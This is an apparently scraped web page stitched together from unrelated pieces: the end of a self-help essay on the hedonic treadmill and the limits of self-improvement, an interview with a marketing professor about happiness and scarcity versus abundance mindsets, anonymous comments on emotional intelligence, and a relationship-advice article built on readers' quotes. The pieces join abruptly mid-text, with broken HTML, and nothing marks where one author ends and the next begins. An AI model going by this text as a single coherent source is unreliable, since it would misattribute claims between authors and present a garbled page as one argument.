forces from within the organization itself.<br>
<div class="RIL_image hasCaption" id="RIL_IMG_1">
<img class="article_image deferred" height="107" id="image_1" width="200" data-src="https://pocket-image-cache.com/direct?resize=w2000&amp;url=https%3A%2F%2Fmarkmanson.net%2Fwp-content%2Fuploads%2F2017%2F02%2Fmagic-johnson-kareem-abdul-jabar-1980-lakers.jpg" src="data:image/gif;base64,R0lGODlhAQABAPAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw=="><div class="ril_caption">
<span class="ril_caption_content">Riley said the 1980 Lakers didn’t get back to the finals the next year because everyone became too focused on themselves.</span><cite><span class="credit_content"></span></cite></div>
</div>
The
 players, like most people, want more. At first, that “more” was winning
 the championship. But once players have that championship, it’s no 
longer enough. The “more” becomes other things — more money, more TV 
commercials, more endorsements and accolades, more playing time, more 
plays called for them, more media attention, etc.<br>
As a result, 
what was once a cohesive group of hardworking men begins to fray. Egos 
get involved. Gatorade bottles are thrown. And the psychological 
composition of the team changes — what was once a perfect chemistry of 
bodies and minds becomes a toxic, atomized mess. Players feel entitled 
to ignore the small, unsexy tasks that actually win championships, 
believing that they’ve earned the right to not do it anymore. And as a 
result, what was the most talented team, ends up failing.<br>
<h2>
More is not always better</h2>
Psychologists didn’t always study <a href="https://markmanson.net/how-to-be-happy">happiness</a>.
 In fact, for most of the field’s history, psychology focused not on the
 positive, but on what fucked people up, what caused mental illness and 
emotional breakdowns and how people should cope with their greatest 
pains.<br>
It wasn’t until the 1980s that a few intrepid academics 
started asking themselves, “Wait a second, my job is kind of a downer. 
What about what makes people happy? Let’s study that instead!” And there
 was much celebration because soon dozens of “happiness” books would 
proliferate bookshelves, selling millions of copies to bored, angsty 
middle-class people with existential crises.<br>
But I’m getting ahead of myself.<br>
One
 of the first things psychologists did to study happiness was a simple 
survey. They took large groups of people and gave them pagers (remember,
 this was the 80s and 90s), and whenever the pager went off, each person
 was to stop and write down two things:<br>
1) On a scale from 1-10, how happy are you at this moment?  <br>
2) What has been going on in your life to cause these feelings?<br>
They
 collected thousands of ratings from hundreds of people from all walks 
of life. And what they discovered was both surprising, and actually, 
incredibly boring.<br>
Pretty much everybody wrote ‘7,’ like, all the time, no matter what.<br>
At
 the grocery store buying milk. Seven. Attending my son’s baseball game.
 Seven. Talking to my boss about making a big sale to a client. Seven.<br>
Even
 when catastrophic stuff did happen — mom got cancer, missed a mortgage 
payment on the house, junior lost an arm in a freak bowling accident — 
happiness levels would dip to the 2-5 range for a short period, and 
then, after a certain amount of time, promptly return to seven.<br>
This
 was true for extremely positive events as well. Lottery winners, dream 
vacations, marriages, people’s ratings would shoot up for a short period
 of time, and then, predictably, settle back in around seven.<br>
This
 fascinated psychologists. Nobody is fully happy all the time. But 
similarly, nobody is fully unhappy all the time either. It seems that 
humans, regardless of our external circumstances, live in a constant 
state of mild-but-not-fully-satisfying happiness. Put another way, 
things are pretty much always fine. But they could also always be 
better.<br>

</figure>But
 this constant ‘seven’ that we’re all more or less always coming back 
to, it plays a little trick on us. And it’s a trick that we all fall for
 over and over again.<br>
The trick is that our brain tells us, “You know, if I could just have a little bit more, I’d finally get to 10 and stay there.”<br>
Most of us live most of our lives this way. Constantly chasing our imagined 10.<br>
You
 think to be happier, you need to get a new job, so you get a new job. 
And then a few months later, you feel like you’d be happier if you had a
 new house. So you get a new house. And then a few months later, it’s an
 awesome beach vacation, so you go on an awesome beach vacation, and 
while you’re on the awesome beach, you’re like, “YOU KNOW WHAT I FUCKING
 NEED? A GODDAMN PIÑA COLADA? CAN’T A FUCKER GET A PIÑA COLADA AROUND 
HERE?” And so you stress about your piña colada, believing that just one
 piña colada will get you to your 10. But then it’s a second piña 
colada. And then a third. And then… well, you know how this turns out. 
You wake up with a hangover and are at a three.<br>
But that’s OK.<br>
Because you know that soon you’ll be back at that seven.<br>
Some psychologists call this constant chasing of pleasure the “hedonic treadmill” because people who are <a href="https://markmanson.net/you-cant-have-it-all">constantly striving for a “better life”</a> end up expending a ton of effort only to end up in the same place.<br>
But wait… I know what you’re saying:<br>
<em>W-T-F, Mark. Does this mean that there’s no point in doing anything?</em><br>
<strong>No,
 it means that we need to be motivated in life by something more than 
our own happiness. It means that we have to be driven by something 
greater than ourselves.</strong><br>
Otherwise, you will simply run 
and run towards some vision of your own glory and improvement, towards 
your perfect 10, all the while feeling as though you’re in the same 
place. Or worse, like Riley’s championship teams, slowly undermining 
what got you there to begin with.<br>
<h2>
Self-Improvement as a Glorified Hobby</h2>
Back in my early 20s, when I was what I would characterize as a “<a href="https://markmanson.net/self-help">self-help junkie</a>,” one of my favorite rituals every year was to sit down around new years and spend hours mapping out my <a href="https://markmanson.net/goals">life goals</a>, my vision for myself, and all of the amazing shit I was going to do to get myself there.<br>
I
 analyze my desires and values and end up with a sexy and 
impressive-sounding list of largely-arbitrary goals, filled with stuff 
like taking a bongo class or making a certain amount of money or finally
 nailing that ever-elusive six-pack.<br>
But I eventually learned that
 the funny thing about self-improvement for the sake of self-improvement
 is that it doesn’t inherently mean anything. It’s just a glorified 
hobby. It’s something to keep you occupied and to enthusiastically 
discuss with other people who have the same hobby.<br>
<strong>It took me a long time to accept the fact that just because something <em>can be improved</em> in my life, does not mean that it <em>should be improved</em> in my life.</strong><br>
The
 improvement is not the problem, it’s the WHY that’s motivating the 
improvement that matters. When one compulsively looks to improve 
oneself, without any greater cause or reason driving it other than 
self-aggrandizement, it leads to a life of immense self-preoccupation, a
 light and beneficent form of narcissism where one’s constant attention 
and focus is on oneself.<br>
And ironically, this will probably make your life worse off.<br>

Years
 ago, a friend of mine once told me: “The best decision I ever made in 
my life was to join a support group. Three years later, the best 
decision I ever made in my life was to stop attending my support group.”<br>
I
 think the same principle is true with all forms of self-improvement. 
Self-improvement tools should be used like bandages, only to be opened 
and applied when something is hurt or seriously wrong, and with the goal
 always being to eventually remove them.<br>
<h2>
Life is not a Game of Improvement, but Rather a Game of Tradeoffs</h2>
I think many people see life in terms of linear growth and improvement. This is probably only true when you’re young.<br>
As
 a kid, your knowledge and understanding of the world grow massively 
each year. As a young adult, your opportunities and skills grow rapidly 
as well.<br>
But once you hit adulthood, once you’re established and 
have developed expertise in certain areas, because you’ve already 
invested so much time and mental energy into your skills and assets, 
life is no longer simply a question of improvement, but <a href="https://markmanson.net/you-cant-have-it-all">rather of trade-off</a>.<br>
I’ve
 spent 10 years developing my ability as a writer. I’ve managed to 
conjure a successful writing career for myself. If I turned around and 
wanted to become a DJ, on the one hand, you could argue, I’m “improving”
 myself, by expanding my talents and skill set, but to put the hundreds 
of hours to become competent at an entirely new artistic endeavor would 
force me to give up some opportunities as a writer. That 500-hours or 
whatever is necessary to DJ competently could be spent writing <a href="https://markmanson.net/books/subtle-art">another book</a>, starting a column at a prestigious magazine, or simply shitting out a bunch more of these blog posts.<br>
The
 same was true with the NBA players who won championships. In their 
eyes, they were just moving up in the world. Yesterday, they won their 
first championship. Today, they’re getting more commercials, a better 
locker, a big, brand new house.<br>
What they didn’t realize is what 
they were trading off. Their time and energy, now occupied by all sorts 
of new luxuries, was no longer able to focus on the nitty-gritty of 
basketball. And as a team, they suffered.<br>
Which brings me back to the guy in search of a coach I met a couple weeks ago.<br>
Ultimately,
 my advice to him was simply to be careful. Be careful with the drive to
 improve for the sake of improvement, the desire for more for no other 
reason than it’s more. Be careful adopting <a href="https://markmanson.net/dreams">new dreams and goals</a> that could harm the success and happiness you’ve already built for yourself today.<br>
Or as the cliche goes, be careful what you wish for, because you just might get it.<br>
<a href="https://markmanson.net/four-stages-of-life">Life is not a checklist</a>.
 It’s not a mountain to scale. It’s not a golf game or a beer commercial
 or whatever other cheesy analogy you want to insert here.<br>
Life is
 an economy. Where everything must be traded for something else and the 
value of all things rise and fall with the amount of attention and 
effort you put into them. And in that economy, we each must eventually <a data-highlightable="1" href="https://markmanson.net/find-what-you-love">choose what you’re willing to trade</a>
 based on what you value. And if you’re not careful with your values, if
 you are willing to trade things away for the sake of another hit of 
dopamine, another temporary trip to your own personal psychological 10, 
then chances are you’re going to fuck things up.<br data-highlightable="1"><br data-highlightable="1">Mark Manson is the author of<i data-highlightable="1"> </i><i><a class="link" data-highlightable="1" href="https://www.amazon.com/Subtle-Art-Not-Giving-Counterintuitive/dp/0062457713/ref=as_li_ss_tl?ie=UTF8&amp;qid=1468352752&amp;sr=8-1-fkmr0&amp;keywords=subtle+art+of+not+giving+a+fuck&amp;linkCode=sl1&amp;tag=entsblo-20&amp;linkId=a81bfe2b59e0df18b29f6d08a6c2db00">The Subtle Art of Not Giving a F*ck: A Counterintuitive Approach to Living a Good Life</a></i>.</div>

</h1>
</div>
  <div class="article-content entry-content" itemprop="articleBody"><section>There are three things, once one’s basic needs are
 satisfied, that academic literature points to as the ingredients for 
happiness: having meaningful social relationships, being good at 
whatever it is one spends one’s days doing, and having the freedom to 
make life decisions independently.<br>
But
 research into happiness has also yielded something a little less 
obvious: Being better educated, richer, or more accomplished doesn’t do 
much to predict whether someone will be happy. In fact, it might mean 
someone is less likely to be satisfied with life.<br>
That
 second finding is the puzzle that Raj Raghunathan, a professor of 
marketing at The University of Texas at Austin’s McCombs School of 
Business, tries to make sense of in his recent book, <em><a href="http://www.indiebound.org/book/9781101980736">If You’re So Smart, Why Aren’t You Happy?</a> </em>Raghunathan’s
 writing does fall under the category of self-help (with all of the pep 
talks and progress worksheets that that entails), but his commitment to 
scientific research serves as ballast for the genre’s more glib 
tendencies.<br>
I recently spoke to Raghunathan about his book, and 
the interview that follows has been edited and condensed for the sake of
 clarity.<br>
<hr>
<strong>Joe Pinsker:</strong>
 One of the premises of your book is that people may have a sense of 
what will make them happy, but they approach those things in ways that 
don’t maximize happiness. Could you provide an example of that 
disconnect?<br>
  </section>       <div>
<div>
   <section><strong>Raj Raghunathan:</strong>
 If you take the need for mastery—the need for competence—there are two 
broad approaches that one can take to becoming very good at something. 
One approach is to engage in what people call social comparisons. That 
is, wanting to be the best at doing something: “I want to be the best 
professor there is,” or something like that.<br>
There are many 
problems with that, but one big problem with that is that it's very 
difficult to assess. What are the yardsticks for judging somebody on a 
particular dimension? What are the yardsticks for being the best 
professor? Is it about research, teaching? Even if you take only 
teaching, is it the ratings you get from students, or is it the content 
that you deliver in class, or the number of students who pass an exam or
 take a test and do really well in it? So it gets very difficult to 
judge, because these yardsticks become increasingly ambiguous as a field
 becomes narrower or more technical.<br>
So
 what happens in general is that people tend to gravitate toward less 
ambiguous—even if they're not so relevant—yardsticks. People judge the 
best professors by the number of awards they get, or the salary that 
they get, or the kind of school that they are in, which might on the 
face of it seem like it's a good yardstick for judging how good somebody
 is, but at the same time it's not really relevant to the particular 
field.<br>
And those yardsticks are ones that we adapt to really 
quickly. So if you get a huge raise this month, you might be happy for a
 month, two months, maybe six months. But after that, you're going to 
get used to it and you're going to want another big bump. And you'll 
want to keep getting those in order to sustain your happiness levels. In
 most people you can see that that's not a very sustainable source of 
happiness.<br>
<strong>Pinsker:</strong> What’s the other mindset?<br>
<strong>Raghunathan:</strong>
 What I recommend is an alternative approach, which is to become a 
little more aware of what it is that you're really good at, and what you
 enjoy doing. When you don't need to compare yourself to other people, 
you gravitate towards things that you instinctively enjoy doing, and 
you're good at, and if you just focus on that for a long enough time, 
then chances are very, very high that you're going to progress towards 
mastery anyway, and the fame and the power and the money and everything 
will come as a byproduct, rather than something that you chase directly 
in trying to be superior to other people.<br>
If
 you were to go back to the three things that people need—mastery, 
belonging, and autonomy—I'd add a fourth, after basic necessities have 
been met. It’s the attitude or the worldview that you bring to life. And
 that worldview can be characterized, just for simplicity, in one of two
 fashions: One extreme is a kind of scarcity-minded approach, that my 
win is going to come at somebody else's loss, which makes you engage in 
social comparisons. And the other view is what I would call a more 
abundance-oriented approach, that there's room for everybody to grow.<br>
  </section></div>
</div>
<div>
<div>
   <section><strong>Pinsker:</strong>
 I was really interested by the line you were drawing in the book 
between abundance and scarcity, because instantly that makes me think of
 economics: Economics is, in many ways, the study of things that are 
scarce. Can you talk about the mental processes that are at play when 
people are thinking in terms of scarcity?<br>
<strong>Raghunathan:</strong>
 I'm not trying to argue in the book that the scarcity mindset is either
 shallow or completely useless. If you're caught in a warzone, if you're
 in a poverty-stricken area, if you're fighting for your survival, if 
you're in a competitive sport like boxing, the scarcity mindset does 
play a very important role.<br>
Most
 of us are the products of people who survived in what was for a very, 
very long time, in our evolution as a species, a scarcity-oriented 
universe. Food was scarce, resources were scarce, fertile land was 
scarce, and so on. So we do have a very hard-wired tendency to be 
scarcity-oriented. But I think what has happened over time is we don't 
have to literally fight for our survival every day.<br>
I think that 
as intelligent beings we need to recognize that some of the vestiges of 
our evolutionary tendencies might be holding us back. If I'm at an 
advertising agency, for example, or in software design, those are the 
kinds of fields where it is now being shown in quite a lot of studies 
that you actually perform better if you don't put yourself under the 
scarcity mindset, if you don’t worry about the outcomes and enjoy the 
process of doing something, rather than the goal.<br>
<strong>Pinsker:</strong>
 Since we’re hard-wired to think in terms of scarcity, I’m very 
interested in what can be done to prod someone into a different mindset.
 One experiment you talked about in the book found that workers who 
received a daily email to remind them to make decisions that maximize 
happiness reported being markedly happier than those who didn't get the 
email. Is it really as simple as that sort of thing?<br>
<strong>Raghunathan:</strong>
 On the one hand, we are hard-wired to focus more on negative things. 
But at the same time, we are also all hard-wired to be seeking a sense 
of happiness and the desire to flourish, and to be the best we can be. 
Ultimately, what we need in order to be happy is at some level pretty 
simple. It requires doing something that you find meaningful, that you 
can kind of get lost in on a daily basis.<br>
When you observe 
children, they are very good at this. They don't get distracted by all 
those extrinsic yardsticks. They go for things that really bring them a 
lot of enjoyment. In my book I talk about when we got my son a little 
mechanical car when he was about 3 years old, because he saw a neighbor 
get that car. He was into the car for about three days. After that he 
wanted to play with the box in which the car came. It was just a box. He
 didn't have any idea that the car cost more, or was more valuable, or 
more technologically advanced. He was into the box because he saw a 
character on a TV show called Hamilton the pig, who lives inside a box. 
He wanted to replicate that life for himself.<br>
  </section></div>
</div>
<div>
<div>
   <section>What
 we were trying to do in that particular study is bring that focus back 
into people's attention. For example, rather than sitting in front of 
the TV, a father might decide to play a little game of baseball with his
 son. What people might do varies, but when there’s a reminder, what we 
discover is that—and these are studies conducted with Fortune 500 
employees, undergraduate students—they make seemingly small, you might 
even call them trivial, decisions, but they add up to a happier life 
overall. This simple reminder on an everyday basis is a kind of reality 
check, which puts things in perspective for people.<br>
<strong>Pinsker:</strong>
 What do you think it is about the messages people receive about what it
 takes to be successful in business that runs counter to this mindset? 
In other words, do you think that working your way up any professional 
ladder requires not thinking in terms of abundance?<br>
<strong>Raghunathan:</strong> Daniel Pink, in his book <em>Drive</em>,
 talks about how what used to be used as motivators to employees—what he
 calls the carrots and sticks approach—are now being replaced by what he
 calls “Motivation 2.0,” which is more trying to figure out what is it 
that people are really passionate about. Google is a famous big company 
that tries to practice this, and Whole Foods is another.<br>
I
 do think that we carry lots of baggage from how businesses used to 
operate. Simon Sinek, in one of his books, makes the argument that 
businesses and the rules by which businesses operate are structured 
along the lines of how the military used to operate—very hierarchical 
and scarcity-oriented. But he talks about how, actually, if you look a 
little bit deeper into the best leaders in the military, they tend not 
to be that way. So there's been a mistaken adoption of a certain set of 
ideas based on how things used to operate in the past, but in fact, 
what's now emerging as a much more successful approach to doing business
 and to being successful is having a more abundance-oriented approach.<br>
In
 the big picture, the business world’s messages are a little jumbled. In
 business schools, I see that there's a huge push towards corporate 
social responsibility and finding a passion, but at the same time, if 
you look at the kinds of people who get invited to come give keynote 
addresses, or what it is that we focus on to improve our <em>Businessweek</em>
 rankings, it's things that are extrinsic. We invite people who made a 
million bucks, and we look at incoming MBA students and their outgoing 
salaries.<br>
<strong>Pinsker:</strong> You mentioned earlier how easily people adapt to positive changes in their lives, and I’m familiar with <a href="http://nymag.com/scienceofus/2016/01/classic-study-on-happiness-and-the-lottery.html">the research</a>
 showing that lottery winners are no happier, a year later, than even 
people who just as recently suffered serious injuries. That resonates 
with me: If you told me back in high school that I was going to be 
writing for a magazine, I'd have been overjoyed. And right now, I am 
happy in many ways, but I still have a lot of the same old insecurities 
and worries about the future. I assume it’s something a lot of others 
experience too. Can you talk about what's necessary to steer yourself 
away from that mindset?<br>
  </section></div>
</div>
<div>
<div>
   <section><strong>Raghunathan:</strong>
 That's the plight of most people in the world, I would say. There are 
expectations that if you achieve some given thing, you're going to be 
happy. But it turns out that's not true. And a large part of that is due
 to adaptation, but a large part of it also is that you see this 
mountain in front of you and you want to climb over it. And when you do,
 it turns out there are more mountains to climb.<br>
The
 one thing that has really really helped me in this regard is a concept 
that I call “the dispassionate pursuit of passion” in the book, and 
basically the concept boils down to not tethering your happiness to the 
achievement of outcomes. The reason why it's important to not tie 
happiness to outcomes is that outcomes by themselves don't really have 
an unambiguously positive or negative effect on your happiness. Yes, 
there are some outcomes—you get a terminal disease, or your child 
dies—that are pretty extreme, but let's leave those out. But if you 
think about it, the breakup that you had with your childhood girlfriend,
 or you broke an arm and were in a hospital bed for two months, when 
they occurred, you might have felt, “Oh my goodness, this is the end of 
the world! I'm never going to recover from it.” But it turns out we're 
very good at recovering from those, and not just that, but those very 
events that we thought were really extremely negative were in fact 
pivotal in making us grow and learn.<br>
Everybody's
 got some kind of a belief about whether good things are going to happen
 or bad things are going to happen. There's no way to scientifically 
prove that one of these beliefs is more accurate than another. But if 
you believe life is benign, you're going to see lots of evidence for it.
 If you think life is malign, you're going to see lots of evidence for 
it. It's kind of like a placebo effect. Given that all of these beliefs 
are all equally valid, why not adopt the belief that is going to be more
 useful to you in your life as you go along?<br>
<strong>Pinsker:</strong>
 It's become clear to me after reading your book and talking to you that
 American culture, and maybe even capitalism in general, doesn't do very
 much to encourage the abundance approach over the scarcity approach. 
Are there any societies or cultures that in your mind have figured this 
out, or is it the case that society will almost always send certain 
messages, and it’s up to individuals to have their own 
counterprogramming?<br>
<strong>Raghunathan:</strong> On the face of 
it, it might look like I'm saying that capitalism in general is not very
 good at promoting an abundance mindset. But I don't think that that is 
entirely accurate. If you were to break capitalism down into two very 
important tenets, one is the freedom of movement of people, thought, and
 goods, and the freedom of choice. The second aspect is a distribution 
of resources according to people's abilities rather than according to 
people's needs.<br>
  </section></div>
</div>
That
 first tenet of capitalism, I think, is beautiful, and I wouldn't let go
 of it. And if that ideology comes with the baggage of distribution of 
resources according to abilities, then I take that package, rather than a
 package where you restrict people's freedom of thought and what kinds 
of choices they can make, even if it's combined with a distribution of 
resources according to people's needs.<br>
Ultimately, you can't force
 people to adopt an abundance mindset. They're going to have to select 
it themselves, through self-exploration and soul-searching, and looking 
at the science. Then, some people consciously arrive at a more 
socialistic way of living, by choice. That's the way in which I think 
this is going to work out best—for capitalism to kind of flip itself on 
its head to arrive at that.</div>

  <div class="article-content entry-content" itemprop="articleBody">Studies show that the higher up the ladder of success you go...CEO, etc... the LOWER your Emotional Intelligence becomes... it peaks at around Middle Management...because THEY MANAGE PEOPLE ALL THE TIME, Up and down the business,.... but the CEO, is like a Director of a movie....he has "people" do that for him..."he focuses on the movie"... so he simply does not need as much to manage the direction of the business. Maybe that is why...<br><br>EQ is all about impusle control, managing to control your emotions (1st u need to be aware of them) and not act like a fool lets say in work. <br>EQ is about recognizing someone's feelings - when they are sad, so that you can behave in a certain understanding way. reading about it wont help, you need to practise. Thats where mindfulness comes in, where focus and self-awarness are a big thing.<br><br>Well Im not interested in business as a psychotherapist but I do see merit in for 'ordinary' people disciering strengths and vulnerabilities in themselves and others and finding ways to minimise conflict and ensure a smoother more fulfilling life path. Any kind of positive structure is worth a try. Manipulation doesnt always have to be a bad thing; also key is getting to know when someone is being genuine or not. We have all been on the receiving end of a game player or a manipulator. Learning from this is the point. This increases our 'emotional intelligence' and we can adjust our attitude according to who we are dealing with. There will always be genuinely nice people, and there will always ar.....s!<br><br>Its just a way to undermine the high aptitude/high IQ among us who don't let "feelz" control everything..a way for the current parasitic "alphas" to stay on top.<br>############<br>According to nationally recognized relationship expert and executive coach Dr. Jeffrey Bernstein, emotional intelligence is a key predictor of children's ability to develop suitable peer relationships, get along at home, develop a well-balanced outlook on life, and reach their academic potential at school. He uses the term EQ to encompass five abilities:<br><br>1. Self-awareness- knowing your emotions, recognizing feelings as they occur, and discriminating between them.<br><br>2. Mood management- handling feelings so they're relevant to the current situation and you react appropriately<br><br>3. Self-motivation- "gathering up" your feelings and directing yourself toward a goal, despite self-doubt, inertia, and impulsiveness<br><br>4. Empathy- recognizing feelings in others and tuning into their verbal and nonverbal cues<br><br>5. Managing relationships- handling interpersonal interaction, conflict resolution, and negotiations<br><br>People who have these skills are the people you want in your corner and in your life. They are capable of not only reading your desires and fears, but they also respect them and help you achieve your goals.<br>#############</div>

<br>
1. Be Together For the Right Reasons<br><br>&nbsp;&nbsp;&nbsp; “Don’t ever be with someone because someone else pressured you to. I got married the first time because I was raised Catholic and that’s what you were supposed to do. Wrong. I got married the second time because I was miserable and lonely and thought having a loving wife would fix everything for me. Also wrong. Took me three tries to figure out what should have been obvious from the beginning, the only reason you should ever be with the person you’re with is because you simply love being around them. It really is that simple.”<br><br>&nbsp;&nbsp;&nbsp; – Greg<br>
<br>
Before we even get into what you should do in your relationship, let’s start with what not to do.<br>
When
 I sent out my request to readers for advice, I added a caveat that 
turned out to be illuminating. I asked people who were on their second 
or third (or fourth) marriages what they did wrong. Where did they mess 
up?<br>
By far, the most common answer was “being with the person for the wrong reasons.”<br>
Some of these wrong reasons included:<br>
<ul>
<li>Pressure from friends and family.</li>
<li>Feeling like a “loser” because they were single and settling for the first person that came along</li>
<li>Being together for image — because the relationship <em>looked good</em> on paper (or in photos), not because the <a href="https://markmanson.net/how-to-find-the-one">two people actually admired each other</a>.</li>
<li>Being young and naive and hopelessly in love and thinking that love would solve everything.</li>
</ul>
<br>
As we’ll see throughout the rest of this article, everything that 
makes a relationship “work” (and by work, I mean that it is happy and 
sustainable for both people involved) requires a genuine, deep-level 
admiration for each other. Without that mutual admiration, everything 
else will unravel.<br>
The other “wrong” reason to enter into a 
relationship is, like Greg said, to “fix” yourself. This desire to use 
the love of someone else to soothe your own emotional problems 
inevitably leads to codependence, an unhealthy and damaging dynamic 
between two people where they tacitly agree to use each other’s love as a
 distraction from their own self-loathing. We’ll get more into 
codependence later in this article, but for now, it’s useful to point 
out that love, itself, is neutral. It is something that can be both 
healthy or unhealthy, helpful or harmful, depending on <em>why</em> and <em>how</em> you love someone else and are loved by someone else. By itself, <a href="https://markmanson.net/love">love is never enough to sustain a relationship</a>.<br>
<h2>
2. Have Realistic Expectations About Relationships and Romance</h2>
<blockquote>
“You
 are absolutely not going to be absolutely gaga over each other every 
single day for the rest of your lives, and all this ‘happily ever after’
 bullshit is just setting people up for failure. They go into 
relationships with these unrealistic expectations. Then, the instant 
they realize they aren’t ‘gaga’ anymore, they think the relationship is 
broken and over, and they need to get out. No! There will be days, or 
weeks, or maybe even longer, when you aren’t all mushy-gushy in-love. 
You’re even going to wake up some morning and think, “Ugh, you’re still 
here….” That’s normal! And more importantly, sticking it out is totally 
worth it, because that, too, will change. In a day, or a week, or maybe 
even longer, you’ll look at that person and a giant wave of love will 
inundate you, and you’ll love them so much you think your heart can’t 
possibly hold it all and is going to burst. Because a love that’s alive 
is also constantly evolving. It expands and contracts and mellows and 
deepens. It’s not going to be the way it used to be, or the way it will 
be, and it shouldn’t be. I think if more couples understood that, they’d
 be less inclined to panic and rush to break up or divorce.”<br>
– Paula</blockquote>
Love
 is a funny thing. In ancient times, people genuinely considered love a 
sickness. Parents warned their children against it, and adults quickly 
arranged marriages before their children were old enough to do something
 dumb in the name of their emotions.<br>
That’s because love, while 
making us feel all giddy and high as if we had just snorted a shoebox 
full of cocaine, makes us highly irrational. We all know that guy (or 
girl) who dropped out of school, sold their car and spent the money to 
elope on the beaches of Tahiti. We all also know that that guy (or girl)
 ended up sulking back a few years later feeling like a moron, not to 
mention broke.<br>
<div class="RIL_image" id="RIL_IMG_2">
<img class="article_image deferred" height="136" id="image_2" width="200" data-src="https://pocket-image-cache.com/direct?resize=w2000&amp;url=https%3A%2F%2Fmarkmanson.net%2Fwp-content%2Fuploads%2F2016%2F12%2Fromeo-and-juliet-not-a-love-story.jpg" src="data:image/gif;base64,R0lGODlhAQABAPAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw=="></div>
That’s
 unbridled love. It’s nature’s way of tricking us into doing insane and 
irrational things to procreate with another person — probably because if
 we stopped to think about the repercussions of having kids, and being 
with the same person forever and ever, no one would ever do it. As Robin
 Williams used to joke, “God gave man a brain and a penis and only 
enough blood to operate one at a time.”<br>
Romantic love is a trap 
designed to get two people to overlook each other’s faults long enough 
to get some babymaking done. It generally only <a href="https://markmanson.net/three-loves-theory">lasts for a few years at most</a>.
 That dizzying high you get staring into your lover’s eyes as if they 
are the stars that make up the heavens — yeah, that mostly goes away. It
 does for everybody. So, once it’s gone, you need to know that you’ve 
buckled yourself down with a human being you genuinely respect and enjoy
 being with, otherwise things are going to get rocky.<br>
True love — 
that is, deep, abiding love that is impervious to emotional whims or 
fancy — is a choice. It’s a constant commitment to a person regardless 
of the present circumstances. It’s a commitment to a person who you 
understand isn’t going to always make you happy — nor should they! — and
 a person who will need to rely on you at times, just as you will rely 
on them.<br>
That form of love is much harder. Primarily because it 
often doesn’t feel very good. It’s unglamorous. It’s lots of early 
morning doctor’s visits. It’s cleaning up bodily fluids you’d rather not
 be cleaning up. It’s dealing with another person’s insecurities and 
fears and ideas, even when you don’t want to.<br>
But this form of 
love is also far more satisfying and meaningful. And, at the end of the 
day, it brings true happiness, not just another series of highs.<br>
<blockquote>
“Happily
 Ever After doesn’t exist. Every day you wake up and decide to love your
 partner and your life – the good, the bad and the ugly. Some days it’s a
 struggle and some days you feel like the luckiest person in the world.”<br>
– Tara</blockquote>
Many people never learn how to breach this <a href="https://markmanson.net/what-love-is">deep, unconditional love</a>. Many people are instead <a href="https://markmanson.net/%20https:/markmanson.net/romance">addicted to the ups and downs of romantic love</a>. They are in it for the feels, so to speak. And when the feels run out, so do they.<br>
Many people get into a relationship as a way to compensate for something they lack or <a href="https://markmanson.net/hate-yourself">hate within themselves</a>. This is a one-way ticket to a <a href="https://markmanson.net/6-toxic-habits">toxic relationship</a> because it makes your love conditional — you will love your partner <em>as long</em> as they help you feel better about yourself. You will give to them <em>as long</em> as they give to you. You will make them happy <em>as long</em> as they make you happy.<br>
This
 conditionality prevents any true, deep-level intimacy from emerging and
 chains the relationship to the bucking throes of each person’s internal
 dramas.<br>
<h2>
3. The Most Important Factor in a Relationship is Not Communication, But Respect</h2>
<blockquote>
“What
 I can tell you is the #1 thing, most important above all else is 
respect. It’s not sexual attraction, looks, shared goals, religion or 
lack of, nor is it love. There are times when you won’t feel love for 
your partner. That is the truth. But you never want to lose respect for 
your partner. Once you lose respect you will never get it back.”<br>
– Laurie</blockquote>
As we scanned through the hundreds of responses we received, my assistant and I began to notice an interesting trend.<br>
People
 who had been through divorces and/or had only been with their partners 
for 10-15 years almost always talked about communication being the most 
important part of making things work. Talk frequently. Talk openly. Talk
 about everything, even if it hurts.<br>
And there is some merit to that (which I’ll get to later).<br>
But we noticed that the thing people with marriages going on 20, 30, or even 40 years talked about most was respect.<br>
My
 sense is that these people, through sheer quantity of experience, have 
learned that communication, no matter how open, transparent and 
disciplined, will always break down at some point. Conflicts are 
ultimately unavoidable, and feelings will always be hurt.<br>
And the only thing that can save you and your partner, that can cushion you both to the <a href="https://markmanson.net/trust">hard landing of human fallibility</a>,
 is an unerring respect for one another, the fact that you hold each 
other in high esteem, believe in one another — often more than you each 
believe in yourselves — and trust that your partner is doing his/her 
best with what they’ve got.<br>
Without that bedrock of respect 
underneath you, you will doubt each other’s intentions. You will judge 
their choices and encroach on their independence. You will feel the need
 to hide things from one another for fear of criticism. And this is when
 the cracks in the edifice begin to appear.<br>
<blockquote>
“My 
husband and I have been together 15 years this winter. I’ve thought a 
lot about what seems to be keeping us together, while marriages around 
us crumble (seriously, it’s everywhere… we seem to be at that age). The 
one word that I keep coming back to is “respect”. Of course, this means 
showing respect, but that is too superficial. Just showing it isn’t 
enough. You have to feel it deep within you. I deeply and genuinely 
respect him for his work ethic, his patience, his creativity, his 
intelligence, and his core values. From this respect comes everything 
else – trust, patience, perseverance (because sometimes life is really 
hard and you both just have to persevere). I want to hear what he has to
 say (even if I don’t agree with him) because I respect his opinion. I 
want to enable him to have some free time within our insanely busy lives
 because I respect his choices of how he spends his time and who he 
spends time with. And, really, what this mutual respect means is that we
 feel safe sharing our deepest, most intimate selves with each other.”<br>
– Nicole</blockquote>
You
 must also respect yourself. Just as your partner must also respect 
his/herself. Because without that self-respect, you will not feel worthy
 of the respect afforded by your partner. You will be unwilling to 
accept it and you will find ways to undermine it. You will constantly 
feel the need to compensate and prove yourself worthy of love, which 
will just backfire.<br>
Respect for your partner and respect for 
yourself are intertwined. As a reader named Olov put it, “Respect 
yourself and your wife. Never talk badly to or about her. If you don’t 
respect your wife, you don’t respect yourself. You chose her – live up 
to that choice.”<br>
So what does respect <em>look like</em>?<br>
Common examples given by many readers:<br>
<ul>
<li>NEVER
 talk shit about your partner or complain about them to your friends. If
 you have a problem with your partner, you should be having that 
conversation <em>with them</em>, not with your friends. Talking bad 
about them will erode your respect for them and make you feel worse 
about being with them, not better.</li>
<li>Respect that they have 
different hobbies, interests and perspectives from you. Just because you
 would spend your time and energy differently, doesn’t mean it’s 
better/worse.</li>
<li>Respect that they have an equal say in the 
relationship, that you are a team, and if one person on the team is not 
happy, then the team is not succeeding.</li>
<li>No secrets. If you’re 
really in this together and you respect one another, everything should 
be fair game. Have a crush on someone else? Discuss it. Laugh about it. 
Had a weird sexual fantasy that sounds ridiculous? Be open about it. 
Nothing should be off-limits.</li>
</ul>
Respect goes hand-in-hand with
